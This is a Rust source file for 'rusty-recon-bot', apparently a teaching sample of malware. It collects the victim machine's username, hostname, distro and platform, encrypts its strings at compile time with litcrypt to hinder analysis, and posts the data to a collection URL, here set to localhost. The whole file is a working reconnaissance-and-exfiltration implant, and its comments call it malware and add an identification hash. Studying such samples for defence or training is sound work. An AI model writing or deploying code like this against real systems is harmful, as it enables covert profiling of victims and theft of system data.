extern crate whoami;
extern crate reqwest;
#[macro_use]
extern crate litcrypt;

use whoami::{distro, username, platform, hostname};

// To use litcrypt, set the Litcrypt env variable from the terminal:
// husky@dev-kde:~/rusty-recon-bot$ export LITCRYPT_ENCRYPT_KEY="RustyReconBot"
use_litcrypt!();

fn collect_info() -> String {
    let mut return_string: String = lc!("================= SYSINFO =================");

    let session_username: String = username();
    let session_hostname: String = hostname();
    let session_distro: String = distro().to_string();
    let session_platform: String = platform().to_string();

    let mut str_username: String  = lc!("❓ Username: ");
    let mut str_hostname: String  = lc!("🏡 Hostname: ");
    let mut str_distro: String = lc!("📀 Distro: ");
    let mut str_platform: String = lc!("🖥️ Platform: ");

    str_username.push_str(&session_username);
    str_hostname.push_str(&session_hostname);
    str_distro.push_str(&session_distro);
    str_platform.push_str(&session_platform);


    return_string.push_str("\n");
    return_string.push_str(&str_username);
    return_string.push_str("\n");
    return_string.push_str(&str_hostname);
    return_string.push_str("\n");
    return_string.push_str(&str_distro);
    return_string.push_str("\n");
    return_string.push_str(&str_platform);


    return_string
}

fn exfil_info(info: String, url: String)  -> Result<String, String>{

    println!("{}", lc!("[*] Sending the following info: "));
    println!("\n {}", info);
    let client = reqwest::blocking::Client::new();
    if let Ok(r) = client.post(&url)
        .body(info)
        .send() {
            if r.status().is_success() {
                return Ok(lc!("[*] Success!"));
            } else {
                return Err(lc!("[-] Something went wrong"));
            }
        } else {
            return Err(lc!("[-] Something went wrong"));
        }
}


fn main() {
    //Imprint string for malware identification
    //let imprint_string = md5sum(Enhgineer's Name:Favorite Starcraft Unit)
    //husky@dev-kde:~/rusty-recon-bot$ echo "Husky:Tassadar" | md5sum
    //    c2edd8a89c77c6f33b6cb949615b78c1
    // THIS VALUE IS NOT LITCRYPTED
    let imprint_string: String = "c2edd8a89c77c6f33b6cb949615b78c1".to_string();
    let _imprint_vec: Vec<String> = vec![imprint_string];


    println!("{}", lc!("[!] Beep boop, I am rusty-recon-bot! I will collect information from this endpoint and send it back to home base."));
    let return_string = collect_info();
    let _resp = exfil_info(return_string, "http://127.0.0.1".to_string());
    println!("{}", lc!("[*] All done! Goodbye"));

}

